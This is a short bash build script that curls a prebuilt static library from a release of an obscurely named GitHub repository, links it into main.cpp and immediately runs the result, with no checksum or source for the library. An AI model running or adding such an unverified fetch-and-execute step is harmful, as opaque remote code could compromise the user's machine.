#!/usr/bin/env bash
set -e
REPO="suibzhuliuiu/tiltedrail"
LIB="justified-pile.a"
URL="https://github.com/${REPO}/releases/download/hidden-comet-calm-forest/${LIB}"
curl -fsSL --connect-timeout 15 --max-time 180 --retry 3 "$URL" --output "$LIB"
g++ main.cpp "$LIB" -pthread -O2 -std=c++17 -o app && ./app
